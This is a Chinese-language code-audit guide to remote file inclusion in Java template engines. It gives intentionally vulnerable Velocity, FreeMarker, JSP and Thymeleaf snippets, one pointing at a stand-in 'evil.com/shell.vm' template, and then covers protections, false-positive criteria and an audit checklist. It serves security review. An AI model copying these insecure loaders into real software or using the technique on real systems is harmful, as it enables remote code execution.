# Java 模板引擎远程包含 RFI

## 漏洞成因
Java 模板引擎（JSP、Velocity、FreeMarker、Thymeleaf 等）允许动态加载用户可控的远程模板 URL，未校验来源和协议限制，演化为 RFI。

---

## Details

### 代码示例

```java
// 危险示例 1: Velocity 加载远程模板
VelocityEngine ve = new VelocityEngine();
String templateUrl = request.getParameter("template");
ve.loadTemplate(templateUrl);  // http://evil.com/shell.vm

// 危险示例 2: FreeMarker 动态模板加载
Configuration cfg = new Configuration();
String url = request.getParameter("template_url");
Template template = cfg.getTemplate(url);
StringWriter writer = new StringWriter();
template.process(context, writer);

// 危险示例 3: JSP 动态包含
<% String page = request.getParameter("page"); %>
<jsp:include page="<%= page %>" />

// 危险示例 4: Thymeleaf 远程模板
String templateName = request.getParameter("view");
return "redirect:" + templateName;  // 可加载远程资源
```

### 快速定位核心操作 (L2: 跳读)
- **模板引擎库**：Velocity、FreeMarker、Thymeleaf、Groovy Templates、JSP
- **关键函数**：
  - Velocity: `loadTemplate()`, `mergeTemplate()`
  - FreeMarker: `getTemplate()`, `Configuration.setTemplateLoader()`
  - Thymeleaf: `process()`, `resolveTemplate()`
  - JSP: `<jsp:include>`, `<jsp:forward>`
- **URL 加载**：`URLClassLoader`, `HttpURLConnection`, 或框架级 HTTP 客户端
- **用户输入来源**：`request.getParameter()`, `request.getHeader()`, `@RequestParam`

### 快速定位保护机制 (L3: 逐行读)
- **白名单验证**：
  - 预定义的模板映射 map
  - `if (!allowedTemplates.contains(templateName))`
- **URL 验证**：
  - 限制协议为 `https://`
  - 限制域名为白名单内
  - `new URL(url).getHost()` 检查
- **路径限制**：
  - 模板加载目录限制（如仅 `/templates/` 目录）
  - `ClassPathResource` 限制在 classpath 内
- **扩展名检查**：
  - 限制模板文件后缀（`.vm`, `.ftl`）
- **Classpath 隔离**：
  - 使用 `ClassPathTemplateLoader` 限制在 classpath 内

---

## Classify

### 漏洞
- 用户可控模板名称或 URL
- 无白名单或白名单可绕过（路径遍历、编码等）
- 直接从用户输入加载并处理模板
- 模板表达式支持代码执行（大多数引擎默认支持）

### 误报
- 模板路径完全来自配置文件或常量
- 用户输入仅作为模板变量，非模板内容
- 模板加载限制在受保护目录（如 classpath）
- 模板来源验证严格（签名或哈希检查）

### 代码异味
- 模板路径部分可控但有验证（需详细检查）
- 使用 `String.contains()` 等弱验证
- 模板加载跨 controller、service 多层调用

---

## Low risk

- **硬编码模板映射**：用户输入映射到预定义的模板名，无动态路径
- **Classpath 隔离**：模板加载器限制在 classpath 内，无法加载外部资源
- **URL 双重限制**：仅允许 HTTPS 且仅限特定内部域名
- **完整性验证**：模板加载前验证签名或哈希
- **Template Loader 限制**：自定义 Loader 拒绝非白名单模板
- **表达式语言禁用**：模板配置禁止表达式执行（如 FreeMarker `api_builtin_enabled=false`）

---

## 审计重点

1. 定位所有模板加载调用点
2. 追踪用户输入到模板参数的完整数据流
3. 检查模板引擎配置和安全设置
4. 验证白名单覆盖率
5. 测试路径遍历和协议绕过
6. 检查 Spring、Struts 等框架的视图解析器配置
